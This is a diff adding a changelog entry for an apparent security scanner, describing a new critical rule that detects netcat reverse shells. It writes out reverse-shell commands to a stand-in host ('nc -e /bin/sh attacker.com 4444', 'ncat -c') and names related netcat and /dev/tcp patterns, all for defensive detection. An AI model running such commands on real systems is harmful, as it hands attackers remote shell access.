@@ -4,6 +4,24 @@
 
 (no entries — next release window)
 
+## [1.10.161] - 2026-05-03
+
+**`netcat-shell-exec` (critical) catalog pattern.** `nc -e
+/bin/sh attacker.com 4444` (or `ncat -c '/bin/sh'`) is the
+canonical netcat-CLI reverse-shell form. The existing
+`reverse-shell` rule covered the bash + /dev/tcp variant.
+The netcat form had a separate carrier (the -e/-c flag) and
+needed a dedicated rule.
+
+### Added
+- **`PATTERN_CATALOG.critical`** entry `netcat-shell-exec`. Catches
+  `nc -e <shell> ...` and `ncat -c <shell> ...`. The flag
+  attaches a shell process to the connection's stdio — every
+  byte sent over the socket runs in the shell. Critical, no
+  benign cause. Bare connect (`nc evil.com 4444`), listen
+  (`nc -lvp 4444` — covered by `netcat-listen`), and verbose
+  flags stay LOW.
+
 ## [1.10.160] - 2026-05-03
 
 **`ssh-tunnel` (high) catalog pattern.** SSH tunneling
